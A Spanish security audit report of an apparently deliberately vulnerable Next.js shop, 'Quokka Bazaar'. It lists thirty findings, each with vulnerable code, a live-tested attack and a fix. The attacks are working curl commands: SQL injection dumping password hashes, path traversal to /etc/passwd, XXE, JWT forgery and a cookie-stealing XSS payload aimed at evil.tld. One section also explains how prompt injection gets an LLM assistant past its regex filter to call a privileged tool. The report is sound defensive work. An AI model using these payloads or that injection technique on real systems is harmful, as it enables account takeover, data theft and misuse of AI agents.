# Auditoría de Seguridad — Quokka Bazaar v2.17.0

**Target:** `quokka-bazaar` — Next.js 15.2.2 / React 19.2.0 / Prisma 6.19.1 + SQLite
**Alcance:** revisión completa del repositorio (API routes, middleware, librerías, esquema, infraestructura, dependencias)
**Fecha:** 2026-11-24
**Metodología:** análisis estático + **verificación dinámica** contra una instancia real compilada y ejecutada (`next build --no-lint` + `next start`), con base de datos semillada.

---

## 1. Resumen ejecutivo

La aplicación **no tiene un ancla de confianza del lado del servidor**. Los importes de los pedidos, los descuentos de cupones, los códigos de tarjeta regalo, el rol del usuario y los dos secretos que protegen la autenticación y el uso compartido de documentos son **todos controlados por el cliente o deterministas**. Como consecuencia, un atacante anónimo puede:

- Crear una cuenta **ADMIN** (mass assignment).
- Forzar un **token de reseteo de contraseña** y **tomar el control de la cuenta de administrador** completa.
- **Leer cualquier archivo del servidor** (`/etc/passwd` incluido) sin autenticación.
- **Extraer la tabla `users` completa** (correos + hashes) mediante inyección SQL.
- **Leer los pedidos, direcciones y wishlists privadas** de cualquier cliente.
- Escalar de `CUSTOMER` a `ADMIN` mediante un token de soporte.
- Forjar el token de compartir documentos y leer pedidos sin autenticación.

Se verificaron **19 vectores de ataque de forma dinámica**; **17 comprobaciones automatizadas** se ejecutan con `security-audit/poc/verify.sh` y hoy reproducen el fallo al 100 %.

| Severidad | Cantidad | Hallazgos |
|---|---:|---|
| **Crítico** | 8 | Mass assignment a ADMIN · Token de reseteo predecible → ATO admin · Inyección SQL ×3 · Lectura arbitraria de archivos · Secreto JWT por defecto · Escalada vía token de soporte · Clave de cifrado fija → fuga de pedidos |
| **Alto** | 7 | Contraseñas MD5 sin sal · Total del pedido confiado al cliente · SSRF · XSS almacenado · XXE · IDOR · Claves/credenciales fijas · Prompt injection |
| **Medio** | 8 | TOCTOU en cupones · Abuso de tarjetas de regalo · Stream hijack · Fuga de secretos en logs · DoS sin límites · Comparaciones no constantes · Host header injection · Otros |
| **Bajo** | 5 | Enumeración de usuarios · Logout sin invalidación · Tokens de larga duración · Divulgación de diagnósticos · Endurecimiento de headers |

> **Veredicto:** no apto para producción. Un atacante anónimo alcanza control administrativo total en ~4 peticiones HTTP.

---

## 2. Tabla resumen de hallazgos

| # | Sev. | Hallazgo | Ubicación principal |
|---|------|----------|---------------------|
| F-01 | 🔴 Crítico | Mass assignment: `role` del cliente → cuenta ADMIN | `app/api/auth/signup/route.ts:59-61` |
| F-02 | 🔴 Crítico | Token de reseteo predecible → toma de control de admin | `app/api/auth/forgot-password/route.ts:22` |
| F-03 | 🔴 Crítico | Inyección SQL en búsqueda de productos (sin auth) | `app/api/products/search/route.ts:93` |
| F-04 | 🔴 Crítico | Inyección SQL en tracking vía `x-forwarded-for` | `app/api/tracking/route.ts:99` |
| F-05 | 🔴 Crítico | Inyección SQL en búsqueda de pedidos | `app/api/orders/search/route.ts:96` |
| F-06 | 🔴 Crítico | Lectura arbitraria de archivos + listado de directorios (sin auth) | `app/api/files/route.ts:49-50` |
| F-07 | 🔴 Crítico | Secreto JWT por defecto `"secret"` + middleware sin verificar firma | `lib/server-auth.ts:12`, `middleware.ts:8-10` |
| F-08 | 🔴 Crítico | Escalada CUSTOMER→ADMIN con token de soporte | `app/api/user/support-access/route.ts:58-80` |
| F-09 | 🔴 Crítico | Clave de cifrado fija → forjar tokens de pedidos | `lib/share-crypto.ts:6-10` |
| F-10 | 🟠 Alto | Contraseñas con MD5 sin sal | `lib/server-auth.ts:14-16` |
| F-11 | 🟠 Alto | Total del pedido tomado del cliente | `app/api/orders/route.ts:39,130` |
| F-12 | 🟠 Alto | SSRF sin restricciones (respuesta reflejada) | `app/api/support/route.ts:16-21` |
| F-13 | 🟠 Alto | XSS almacenado en reseñas | `app/products/[id]/ProductDetailClient.tsx:55` |
| F-14 | 🟠 Alto | XXE en importación de pedidos de proveedor | `app/api/admin/suppliers/import-order/route.ts:21-24` |
| F-15 | 🟠 Alto | IDOR en pedidos y wishlists privadas | `app/api/orders/[id]/route.ts:12`, `app/api/wishlists/[id]/route.ts:10` |
| F-16 | 🟠 Alto | Credenciales fijas (SIEM `root`/`admin`, token diag, stream key) | `app/api/monitoring/auth/route.ts:5-6` |
| F-17 | 🟠 Alto | Prompt injection: el LLM ejecuta la herramienta privilegiada MCP | `app/api/ai-assistant/route.ts:177-193` |
| F-18 | 🟡 Medio | TOCTOU en cupones → supera `maxUses` | `app/api/orders/route.ts:64-88` |
| F-19 | 🟡 Medio | Códigos de tarjeta regalo deterministas | `lib/gift-card.ts:9-25` |
| F-20 | 🟡 Medio | Robo de broadcast + fuga de `streamKey` a cualquier cliente | `app/api/live/stream/route.ts:30,72` |
| F-21 | 🟡 Medio | Contraseñas en claro en los logs | `app/api/auth/login/route.ts:16-25` |
| F-22 | 🟡 Medio | Sin rate limiting en ningún endpoint | global |
| F-23 | 🟡 Medio | Exportación de datos de usuario filtra hash de contraseña | `app/api/user/export/route.ts:7` |
| F-24 | 🟡 Medio | MCP con credencial estática embebida | `lib/mcp-constants.ts` |
| F-25 | 🟡 Medio | Header `Host`/`X-Forwarded-Proto` inyectado en URLs de compartir | `app/api/orders/[id]/share/route.ts:21-23` |
| F-26 | 🔵 Bajo | Enumeración de usuarios por mensajes de error | `app/api/auth/login/route.ts:40-47` |
| F-27 | 🔵 Bajo | Logout no invalida el token | `app/api/auth/logout/route.ts` |
| F-28 | 🔵 Bajo | Token de soporte de 365 días y sin comprobar `revoked` | `app/api/auth/support-login/route.ts:28-49` |
| F-29 | 🔵 Bajo | Dependencias vulnerables (`next@15.2.2`, `react@19.2.0`) | `package.json:33,39-40` |
| F-30 | 🔵 Bajo | Divulgación de diagnósticos y stack traces | `app/api/user/export/route.ts:35-61` |

---

## 3. Hallazgos críticos

### F-01 · Mass assignment → creación de cuentas ADMIN

**`app/api/auth/signup/route.ts:59-61`**
```ts
if (body.role) {
  userData.role = body.role as UserRole;
}
```
El esquema de validación acepta explícitamente el campo `role` y además usa `.passthrough()`, por lo que **cualquier campo no declarado se propaga al objeto de usuario**:

**`lib/validation/schemas/auth.ts:3-9`**
```ts
export const signupBodySchema = z
  .object({
    email: z.string(),
    password: z.string(),
    role: z.string().optional(),   // <-- rol controlable por el cliente
  })
  .passthrough();
```

**Verificado en vivo:**
```bash
$ curl -X POST http://localhost:3000/api/auth/signup -H 'Content-Type: application/json' \
    -d '{"email":"pwn@evil.com","password":"pw123456","role":"ADMIN"}'
{"user":{"id":"cmwuge33h00017d0gtp450uvj","email":"pwn@evil.com","role":"ADMIN"}}
```
El token de sesión se emite a continuación con `role: user.role` (`signup/route.ts:72-78`), es decir, la cuenta adminificada queda usable de inmediato.

**Impacto:** escalada de privilegios no autenticada a administrador.
**Remediación:** eliminar `role` del esquema y de `userData`; nunca asignar el rol desde la entrada del cliente. Añadir el rol a una lista blanca explícita si alguna vez debe venir del exterior.

---

### F-02 · Token de reseteo de contraseña predecible → toma de control de la cuenta de administrador

**`app/api/auth/forgot-password/route.ts:13-36`**
```ts
const timestamp = Math.floor(now.getTime() / 1000);   // resolución de 1 segundo
...
const token = hashMD5(email + timestamp);             // sin secreto, sin nonce, sin aleatoriedad
```

El token es `MD5(correo + unix_seconds)`. No contiene ningún valor aleatorio ni secreto: basta con que el atacante **solicite** un reseteo para la víctima y pruebe los segundos siguientes/previos, calculando el MD5 localmente.

**Verificado en vivo (cadena completa de toma de control):**
```bash
$ TS=$(date +%s)
$ curl -X POST http://localhost:3000/api/auth/forgot-password -H 'Content-Type: application/json' \
    -d '{"email":"admin@quokka.store"}'
# Token PREDECHO offline en la ventana ±30s:
predicted token: 084cac8f61e9c3472e49f3de10e18296   (ts=1795510180)

$ curl -X POST http://localhost:3000/api/auth/reset-password -H 'Content-Type: application/json' \
    -d '{"token":"084cac8f61e9c3472e49f3de10e18296","password":"pwned123"}'
{"message":"Your password has been reset successfully."}

$ curl -X POST http://localhost:3000/api/auth/login -H 'Content-Type: application/json' \
    -d '{"email":"admin@quokka.store","password":"pwned123"}'
{"user":{"id":"cmwugca7600077doyh39a1y3g","email":"admin@quokka.store","role":"ADMIN"}}
```

**Problemas agravantes:**
- El token se almacena **en texto plano** en la BD (`prisma/schema.prisma:253-262`): una filtración de la base de datos equivale a una toma de control inmediata.
- El marcado `used: true` ocurre **después** de actualizar la contraseña y fuera de transacción (`reset-password/route.ts:48-56`): dos peticiones concurrentes con el mismo token pueden completarse ambas.
- El reseteo **no invalida las sesiones existentes**: el atacante que disparó el reseteo conserva su cookie.

**Remediación:** `crypto.randomBytes(32)` para el token; almacenar **solo su hash**; comparación con `crypto.timingSafeEqual`; invalidación atómica (`updateMany where { id, used: false }`) en una única transacción; revocar todas las sesiones del usuario al cambiar la contraseña.

---

### F-03 · Inyección SQL en `/api/products/search` — sin autenticación

**`app/api/products/search/route.ts:85-100`**
```ts
const sqlQuery = `
  SELECT id, name, description, price, "imageUrl"
  FROM products
  WHERE name LIKE '%${query}%' OR description LIKE '%${query}%'
  ORDER BY name ASC LIMIT 50
`;
const queryResults = (await prisma.$queryRawUnsafe(sqlQuery)) as ...
```
`query` proviene de `?q=` y el esquema solo lo restringe a `z.string().optional()` (`lib/validation/schemas/products.ts:3-5`). No hay escapado ni parametrización.

**Verificado en vivo — volcado completo de la tabla `users`:**
```bash
$ curl -s -G http://localhost:3000/api/products/search \
    --data-urlencode "q=' UNION SELECT id,password,email,role,1 FROM users-- "
{"products":[
  {"id":"...","name":"0571749e2ac330a7455809c6b0e7af90","description":"vis.bruta@example.com","price":"CUSTOMER","imageUrl":"1"},
  {"id":"...","name":"21232f297a57a5a743894a0e4a801fc3","description":"admin@quokka.store","price":"ADMIN","imageUrl":"1"},
  {"id":"...","name":"94f9a918ee6b78c2dbf04af54d833a5e","description":"pwn@evil.com","price":"ADMIN","imageUrl":"1"}, ...]}
```
Se obtienen **correos, hashes MD5 de contraseña y roles** de todos los usuarios, sin necesidad de autenticarse.

**Remediación:** eliminar `$queryRawUnsafe`; usar `prisma.product.findMany({ where: { OR: [{name:{contains:query}},{description:{contains:query}}] } })`. Si la búsqueda requires `LIKE` con comodines, parametrizar con `Prisma.sql`.

---

### F-04 · Inyección SQL en `/api/tracking` vía cabecera `x-forwarded-for`

**`app/api/tracking/route.ts:96-103`**
```ts
const forwardedFor = request.headers.get("x-forwarded-for");
const ip = forwardedFor || request.headers.get("x-real-ip") || "unknown";   // <-- sin escapar
...
const query = `
  INSERT INTO visitor_logs (id, ip, userAgent, path, sessionId, createdAt)
  VALUES ('${id}', '${ip}', '${userAgent.replace(/'/g, "''")}', '${visitPath.replace(/'/g, "''")}', ...)
`;
await prisma.$queryRawUnsafe(query);
```
`userAgent` y `visitPath` sí están escapados, pero **`ip` no**. La cadena SQL se construye con el valor crudo de una cabecera HTTP totalmente controlada por el atacante.

**Verificado en vivo — exfiltración del hash de admin:**
```bash
$ curl -X POST http://localhost:3000/api/tracking -H 'Content-Type: application/json' \
    -H "x-forwarded-for: ' || (SELECT email||':'||password FROM users WHERE role='ADMIN' LIMIT 1) || '" \
    -d '{"path":"/x"}'
{"success":true}

$ sqlite3 audit.db "select ip from visitor_logs where path='/x'"
ip = "admin@quokka.store:21232f297a57a5a743894a0e4a801fc3"
```
El valor inyectado queda almacenado en `visitor_logs.ip` y **se muestra sin escapar en el panel de analítica de administración** (`app/admin/analytics/AnalyticsClient.tsx:366` usa `dangerouslySetInnerHTML={{ __html: visit.ip }}`) → la cadena de SQLi escala además a **XSS almacenado en el panel de admin** (F-13).

**Remediación:** usar `prisma.visitorLog.create({ data: { ... } })`. No concatenar SQL. Si es imprescindible, usar siempre `$queryRaw` con `Prisma.sql` parametrizado.

---

### F-05 · Inyección SQL en `/api/orders/search`

**`app/api/orders/search/route.ts:81-102`**
```ts
const statusFilter = status ? `AND o.status = '${status}'` : "";
const query = `... WHERE o."userId" = '${user.id}' ${statusFilter} ORDER BY o.id DESC`;
const queryResults = (await prisma.$queryRawUnsafe(query)) as ...
```
`status` es una cadena libre (`lib/validation/schemas/orders.ts:12-14`). Además `user.id` proviene del payload JWT, que —debido a F-07— es **controlado por el atacante**.

**Remediación:** `prisma.order.findMany({ where: { userId: user.id, status } })` con `status` tipado como enum `OrderStatus`.

---

### F-06 · Lectura arbitraria de archivos y listado de directorios sin autenticación

**`app/api/files/route.ts:8-51`**
```ts
export async function GET(request: NextRequest) {          // <-- sin withAuth
  ...
  const baseDir = join(process.cwd(), "documents");
  if (listDir === "true") {
    const targetDir = join(baseDir, dirPath);              // path traversal
    const entries = await readdir(targetDir, { withFileTypes: true });
    ...
  }
  const filePath = join(baseDir, file);                     // path traversal
  const content = await readFile(filePath, "utf-8");
  return NextResponse.json({ filename: file, content });
}
```
`path.join` **normaliza** los segmentos `..`, de modo que `join(baseDir, "../..")` escapa del directorio base. No hay ninguna comprobación de contención de ruta ni de autenticación.

**Verificado en vivo:**
```bash
$ curl -s "http://localhost:3000/api/files?file=../../../../../../etc/passwd"
{"filename":"../../../../../../etc/passwd","content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}

$ curl -s "http://localhost:3000/api/files?list=true&path=../"
{"path":"../","items":[{"name":".dockerignore",...},{"name":".env.local","size":94,...},{"name":".next","type":"directory",...}, ...]}
```
El listado del directorio del proyecto expone `.env.local`; la lectura de archivos permite llegar a `.env.local`, `flag.txt`, `supplier-registry.txt`, `prisma/dev.db` y a cualquier archivo del sistema.

**Remediación:** exigir autenticación y autorización por rol; resolver la ruta con `path.resolve` y verificar que **el resultado** sigue dentro del directorio base:
```ts
const target = path.resolve(baseDir, file);
if (!target.startsWith(path.resolve(baseDir) + path.sep)) return 400;
```

---

### F-07 · Secreto JWT por defecto `"secret"` y middleware que no verifica la firma

**`lib/server-auth.ts:12`**
```ts
const JWT_SECRET = process.env.JWT_SECRET || "secret";
```
`JWT_SECRET` **no está definido** ni en `.env.local` ni en `docker-compose.yml:9-11`, por lo que el valor por defecto está activo: todos los tokens HS256 de la aplicación se firman con la cadena literal `"secret"`. Cualquier atacante puede **forjar un `authToken` con `role: "ADMIN"`** que pase `withAdminAuth` en todas las rutas admin.

Además, el middleware **decodifica sin verificar**:
**`middleware.ts:3-20`**
```ts
function decodeJWT(token: string): Record<string, unknown> | null {
  const parts = token.split(".");
  if (parts.length !== 3) return null;
  const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
  if (payload.exp && payload.exp < Math.floor(Date.now() / 1000)) return null;
  return payload;                     // <-- la firma NUNCA se comprueba
}
...
if (payload.role !== "ADMIN") { return NextResponse.redirect(...); }
```

**Verificado en vivo:**
```bash
# Token forjado con firma inválida "BADSIG"
$ curl -s -o /dev/null -w '%{http_code}\n' -H "Cookie: authToken=$FORGED" \
    http://localhost:3000/monitoring/internal-status
200                       # <-- el middleware acepta el token

$ curl -s -o /dev/null -w '%{http_code}\n' http://localhost:3000/monitoring/internal-status
307                       # sin cookie -> redirige a /login
```
Y con el secreto por defecto se puede forjar una cookie admin válida para **toda** la aplicación:
```bash
# Con JWT_SECRET sin definir, HMAC-SHA256("...", "secret") produce un token admin válido
```

**Remediación:** exigir `JWT_SECRET` en el arranque (lanzar si falta), con ≥32 bytes aleatorios; **rotar** el valor; usar `crypto.timingSafeEqual` para comparar firmas; en el middleware, verificar la firma (o delegar la comprobación en las rutas, que ya la hacen bien); usar la librería `jose` en lugar de implementación manual.

---

### F-08 · Escalada de privilegios CUSTOMER → ADMIN mediante tokens de soporte

**`app/api/user/support-access/route.ts:58-80`**
```ts
const targetEmail = parsed.data?.email || user.email;    // <-- email arbitrario del cuerpo
const targetUser = await prisma.user.findUnique({ where: { email: targetEmail }, ... });
const token = generateSecureToken();
const supportToken = await prisma.supportAccessToken.create({
  data: { token, userId: targetUser.id, email: targetUser.email, expiresAt },
});
```
Cualquier usuario autenticado puede crear un token **para cualquier otra cuenta, incluida la de administrador**. El token se devuelve en la respuesta (línea 86) y se canjea por una sesión con el rol del objetivo:

**`app/api/auth/support-login/route.ts:42-49`**
```ts
const authToken = createSessionToken({
  id: supportToken.user.id,
  email: supportToken.user.email,
  role: supportToken.user.role,           // <-- rol del objetivo
  exp: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365,
  supportAccess: true,
});
```

**Verificado en vivo:**
```bash
$ curl -c alice.jar -X POST .../api/auth/login -d '{"email":"alice@example.com","password":"iloveduck"}'
{"user":{"id":"...","email":"alice@example.com","role":"CUSTOMER"}}

$ curl -b alice.jar -X POST .../api/user/support-access -d '{"email":"admin@quokka.store"}'
{"supportToken":{"token":"6cc42226ee9ef82d3845b4faab1840f37...","email":"admin@quokka.store", ...}}

$ curl ".../api/auth/support-login?token=6cc42226ee9ef82d..."
{"user":{"id":"...","email":"admin@quokka.store","role":"ADMIN"}}
```

**Agravantes:** el endpoint de login **no comprueba `supportToken.revoked`** (líneas 28-40), pese a que existe un `DELETE /api/user/support-access` que lo revoca; la sesión dura **365 días** frente a 7 de una sesión normal; el claim `supportAccess` **nunca restringe nada** (solo se lee como pista de informe en `app/api/admin/support-audit/route.ts:33`).

**Remediación:** el token de soporte solo puede emitirse para la cuenta del propio solicitante o por un administrador; comprobar `revoked` en el canje; auditar y notificar cada emisión; TTL corto (p. ej. 1 h) con revocación efectiva.

---

### F-09 · Clave de cifrado fija → forjar tokens de compartir y leer pedidos sin autenticación

**`lib/share-crypto.ts:6-10`**
```ts
const SHARE_KEY = Buffer.from(
  process.env.SHARE_ENCRYPTION_KEY ||
    "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
  "hex"
);
```
`SHARE_ENCRYPTION_KEY` no está definido → la clave por defecto está activa. El endpoint de compartir **no tiene autenticación** y carga el pedido por id sin comprobar propiedad (`app/api/documents/share/route.ts:44-54`).

**Verificado en vivo:**
```bash
$ TOKEN=$(node -e '/* cifra "order:ORD-001" con la clave por defecto */')
$ curl -s "http://localhost:3000/api/documents/share?token=$TOKEN"
{"type":"order","order":{"id":"ORD-001","total":23.95,"status":"DELIVERED","customerName":"Bob",
 "items":[...],"deliveryAddress":{"street":"Friedrichstraße 123","city":"Berlin",...}}}
```
Filtración **no autenticada** de pedidos, importes y direcciones de entrega (PII).

**Remediación:** exigir `SHARE_ENCRYPTION_KEY` al arranque; rotarla; añadir autenticación (AEAD) al ciphertext — AES-256-CBC sin MAC es vulnerable a manipulación de bits; usar `aes-256-gcm`.

---

## 4. Hallazgos de severidad alta

### F-10 · Contraseñas con MD5 sin sal
**`lib/server-auth.ts:14-16`** — `crypto.createHash("md5").update(text).digest("hex")`. Se usa en registro, verificación, reseteo y seed. No hay bcrypt/argon2/scrypt/pbkdf2 en el código de aplicación. Los hashes son idénticos para contraseñas iguales y se rompen a billions por hash. `admin@quokka.store` → `21232f297a57a5a743894a0e4a801fc3` (`MD5("admin")`).
**Remediación:** argon2id o bcrypt (coste ≥ 12) con sal por usuario; rehash transparente al iniciar sesión.

### F-11 · El total del pedido lo decide el cliente
**`app/api/orders/route.ts:39,125-133`** — `const { total } = parsed.data;` se escribe directamente en `order.total` (y en la factura PDF, `lib/invoice.ts:173-178`). El carrito se carga (líneas 41-50) pero su total calculado **nunca se compara**. No existe integración con pasarela de pago; la cabecera `X-Payment-Auth` del cliente nunca se valida en el servidor.
**Verificado en vivo:**
```bash
# carrito real: 2 x 5.49 = 10.98
$ curl -b alice.jar -X POST .../api/orders -d '{"total":0.01,"addressId":"addr-alice-001"}'
{"id":"ORD-004","total":0.01,"status":"PENDING"}
```
**Remediación:** recalcular `total` en el servidor desde `cartItems × product.price`; rechazar el valor del cliente; aplicar el descuento de cupón en el servidor.

### F-12 · SSRF sin restricciones con respuesta reflejada
**`app/api/support/route.ts:14-21`** — `fetch(screenshotUrl)` sin validación de esquema, host ni IP, y la respuesta se devuelve íntegra en el JSON. El endpoint **no requiere autenticación**. Además se adjunta la cabecera de confianza `"X-Internal-Request": "true"` a la petición saliente (patrón de *confused deputy*).
**Verificado en vivo:**
```bash
$ curl -X POST .../api/support -d '{"email":"a@b.com","title":"t","description":"d",
                                  "screenshotUrl":"http://127.0.0.1:3000/api/flags"}'
{"success":true,"data":{...,"screenshotContent":"[{\"id\":\"...\",\"flag\":\"QKB{7e8aa36bdf38}\",...}]"}}
```
> Nota: el intento a `169.254.169.254` (metadatos de nube) fue bloqueado por la red del entorno de pruebas, no por la aplicación. La aplicación no implementa ninguna defensa.

**Remediación:** eliminar la funcionalidad o aplicar una *allowlist* estricta: solo `https:`, resolver el host y rechazar IPs privadas/loopback/link-local/CGNAT, `redirect: "manual"`, timeout y límite de tamaño de respuesta. Quitar la cabecera `X-Internal-Request`.

### F-13 · XSS almacenado en las reseñas de producto
**`app/api/products/[id]/reviews/route.ts:41-71`** — la creación de reseñas **no exige autenticación** (`user?.email || "anonymous"`, línea 63) y acepta `author` libre del cliente.
**`app/products/[id]/ProductDetailClient.tsx:51-67`** — el contenido se inyecta con `innerHTML` y además se **re-crean los `<script>` para forzar su ejecución**:
```ts
reviewElement.innerHTML = review.content;
const scripts = reviewElement.querySelectorAll("script");
scripts.forEach((oldScript) => { /* crea un <script> nuevo y lo reemplaza */ });
```
**Verificado en vivo:**
```bash
$ curl -X POST .../api/products/$PROD/reviews -H 'Content-Type: application/json' \
    -d '{"content":"<img src=x onerror=fetch(\"//evil.tld?c=\"+document.cookie)>","author":"attacker"}'
{"id":"...","content":"<img src=x onerror=fetch(\"//evil.tld?c=\"+document.cookie)>", ...}
```
La misma clase de sink aparece en `app/admin/analytics/AnalyticsClient.tsx:366` (`visit.ip`, controlable vía F-04) y en `app/support/SupportForm.tsx:103` (`screenshotContent`, controlable vía F-12).
**Remediación:** renderizar el contenido como texto de React; si se requiere Markdown, usar `react-markdown` con sanitizado; eliminar la re-ejecución de scripts; añadir CSP.

### F-14 · XXE en la importación de pedidos de proveedor
**`app/api/admin/suppliers/import-order/route.ts:21-24`**
```ts
const doc = libxmljs.parseXmlString(rawXml, { noent: true, dtdload: true });
```
`dtdload` + `noent` habilitan la resolución de entidades externas.
**Verificado en vivo:**
```bash
$ curl -b admin.jar -X POST .../api/admin/suppliers/import-order -H 'Content-Type: application/xml' \
    -d '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <order><supplierId>&xxe;</supplierId><orderId>ORD-XXE</orderId><total>1</total></order>'
{"message":"Supplier order imported successfully.","order":{"supplierId":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}}
```
**Remediación:** `noent: false`, `dtdload: false`, `dtdvalid: false`; parsear con una biblioteca sin soporte de entidades externas; validar el esquema con un allowlist de campos.

### F-15 · IDOR en pedidos y wishlists privadas
**`app/api/orders/[id]/route.ts:12-22`** — `where: { id }` **sin** `userId`; el handler es `withAuth`, no `withAdminAuth`.
**`app/api/wishlists/[id]/route.ts:10-24`** — sin comprobación de propiedad y **sin honorar `isPublic`** (el campo solo se devuelve, no se aplica). El mismo archivo **sí** comprueba propiedad en `DELETE` (líneas 109-111), lo que demuestra que la omisión en el GET es un defecto.
**Verificado en vivo:**
```bash
$ curl -b alice.jar .../api/wishlists/wl-bob-001      # wishlist privada de Bob
{"id":"wl-bob-001","name":"Weekend Groceries","ownerEmail":"bob@example.com","isPublic":false,...}

$ curl -b alice.jar .../api/orders/ORD-001            # pedido de Bob
{"id":"ORD-001","total":23.95,"customerEmail":"bob@example.com",
 "deliveryAddress":{"street":"Friedrichstraße 123","city":"Berlin","zipCode":"10117","country":"Germany"}}
```
**Remediación:** filtrar por `userId: user.id` (el patrón correcto ya existe en `app/api/orders/[id]/share/route.ts:11-13`); en wishlists, aceptar `userId === user.id || isPublic`.

### F-16 · Credenciales y secretos fijos en el código
| Secreto | Ubicación |
|---|---|
| SIEM `root` / `admin` | `app/api/monitoring/auth/route.ts:5-6`, `app/api/monitoring/logs/route.ts:7-8` |
| Token de diagnóstico `dbg_8f3a7c91e2b4d6a05e21` | `app/api/admin/diag/route.ts:6` |
| `streamKey` de ingesta RTMP `live_8f3c1a9d-prod-ingest-key` | `lib/live-stream.ts:14` |
| Credenciales de seed (`admin@quokka.store`/`admin`, `alice`/`iloveduck`…) | `prisma/seed.ts:655-716` |
| Clave de cifrado de compartir | `lib/share-crypto.ts:8` |
| Secreto JWT `"secret"` | `lib/server-auth.ts:12` |
| `NEXT_PUBLIC_PAYMENT_SECRET` (¡expuesto al navegador!) | `.env.local:1` |

**Verificado en vivo:** `curl -u root:admin .../api/monitoring/logs` → `200`.
**Remediación:** mover todo a variables de entorno **sin valores por defecto**, rotar las credenciales, eliminar `NEXT_PUBLIC_` del secreto de pagos, y no sembrar contraseñas por defecto en producción.

### F-17 · Prompt injection: el LLM ejecuta la herramienta MCP privilegiada
**`app/api/ai-assistant/route.ts:177-193`** — el servidor MCP interno se direcciona **siempre** con la credencial privilegiada `X-MCP-Session: quokka-internal-agent` (`lib/mcp-constants.ts`), y la decisión de invocar `get_compliance_report` la toma **solo el LLM**, protegido únicamente por un filtro de 4 regex (`lib/prompt-injection-filter.ts`) y una instrucción en el prompt.
El filtro es trivialmente evadible: no tiene flag `s` (los saltos de línea rompen el patrón), cubre solo 4 formulaciones y **no se aplica a la salida de herramientas** (un servidor MCP externo controlado por el atacante puede inyectar instrucciones en el turno que tiene la credencial).
Además, el prompt del sistema contiene un secreto (`app/api/ai-assistant/route.ts:22`) e instruye a parangonear códigos de verificación (línea 30).
**Remediación:** mover la autorización al servidor (`app/api/mcp/route.ts` debe validar al llamador autenticado, no una cabecera que adjunta la ruta del LLM); rotar el secreto a variable de entorno; dejar de tratar el filtro como control de seguridad; eliminar secretos del prompt.

---

## 5. Hallazgos de severidad media

- **F-18 · TOCTOU en cupones.** `app/api/orders/route.ts:64-88` comprueba `usedCount < maxUses` y luego incrementa **sin condición**, con un `setTimeout(150)` explícito que facilita la carrera. El cupón sembrado `FLASHSALE` tiene `maxUses: 1`. No hay registro por usuario → reutilización ilimitada. → Usar `updateMany({ where: { code, usedCount: { lt: maxUses } } })` y comprobar `count`.
- **F-19 · Códigos de tarjeta regalo deterministas.** `lib/gift-card.ts:9-25` usa un LCG sembrado con `Date.now()`, y la semilla se devuelve al cliente en `createdAt`. **Verificado:** la tarjeta de $500 sembrada se recomputa offline desde la fecha pública del seed → `JQSP-2G6N-G2ZY` (coincide con la almacenada). → Generar con `crypto.randomBytes`.
- **F-20 · Robo de broadcast y fuga de `streamKey`.** `app/api/live/stream/route.ts` usa `withAuth` (no `withAdminAuth`) y devuelve la fila completa de `StreamConfig`, incluido `streamKey` y `rtmpUrl`. **Verificado:** un `CUSTOMER` fijó `liveVideoId` y obtuvo `{"ok":true,...,"hijacked":true}`; el `streamKey` aparece en la respuesta de un cliente normal.
- **F-21 · Contraseñas en claro en los logs.** `app/api/auth/login/route.ts:16-25` registra `password` en claro en `logs/app.log` (y en cualquier agregador). **Verificado:** `[auth] login attempt email=admin@quokka.store password=pwned123`, legible con las credenciales SIEM fijas.
- **F-22 · Sin rate limiting.** No hay limitador en ningún endpoint (grep de `rateLimit|throttle|429` sin resultados). Habilita credential stuffing, fuerza bruta de tokens de reseteo y de códigos de regalo.
- **F-23 · Exportación con hash de contraseña.** `app/api/user/export/route.ts:7` incluye `"password"` en `ALLOWED_USER_FIELDS`; la ruta de campo inválido devuelve `debug.systemDiagnostics` con `process.version`, `NODE_ENV`, stack trace y un valor de flag (líneas 48-51).
- **F-24 · MCP con credencial estática.** `app/api/mcp/route.ts` no exige autenticación de usuario; la única protección de la herramienta privilegiada es el literal `quokka-internal-agent` en el código fuente.
- **F-25 · Host header injection.** `app/api/orders/[id]/share/route.ts:21-23` construye la URL de compartir con `Host`/`X-Forwarded-Proto` → enlaces de phishing que exfiltran el token. Usar `NEXT_PUBLIC_BASE_URL`.

---

## 6. Hallazgos de severidad baja

- **F-26 · Enumeración de usuarios.** `login/route.ts:40-47` distingue *"Invalid credentials"* (correo inexistente) de *"Invalid password"* (correo existente).
- **F-27 · Logout sin invalidación.** `app/api/auth/logout/route.ts` solo borra la cookie; el JWT es stateless y no hay lista de revocación.
- **F-28 · Token de soporte de 365 días**, devuelto en las respuestas y sin comprobación de `revoked` en el canje.
- **F-29 · Dependencias vulnerables.** `npm ci` advierte explícitamente: `next@15.2.2: This version has a security vulnerability... See https://nextjs.org/blog/CVE-2025-66478`. El proyecto usa además `react@19.2.0` (superficie RSC, CVE-2025-55182 referenciada en `.env.local`) y `eslint-config-next@16.0.6` desalineado con `next@15`. → Actualizar a versiones parcheadas.
- **F-30 · Divulgación de diagnósticos.** Stack traces y variables de entorno devueltas al cliente en rutas de error.

---

## 7. Aspectos positivos

| Control | Evidencia |
|---|---|
| Doble gasto de tarjeta regalo **prevenido** | `app/api/gift-cards/redeem/route.ts:52-66` — `updateMany({ id, status: "PENDING" })` atómico + comprobación de `count === 0` |
| Comparación constante de códigos de regalo | `app/api/gift-cards/redeem/route.ts:13-22` — `timingSafeEqualStrings` |
| Propiedad verificada al compartir un pedido | `app/api/orders/[id]/share/route.ts:11-13` — `where: { id, userId: user.id }` |
| Propiedad verificada al añadir/borrar ítems de wishlist | `app/api/wishlists/[id]/items/route.ts:23-25`, `.../[itemId]/route.ts:21-34` |
| Propiedad verificada en el carrito | `app/api/cart/items/[id]/route.ts:26-28, 68-70` |
| Denominaciones de tarjeta regalo con lista blanca | `app/api/gift-cards/route.ts:44-49` + `lib/gift-card.ts:30-34` |
| Cookie de sesión `httpOnly` + `sameSite=lax` + `secure` en producción | `lib/server-auth.ts:71-79` |
| Sin enumeración en el reseteo de contraseña | `app/api/auth/forgot-password/route.ts:39-43` — mensaje uniforme |
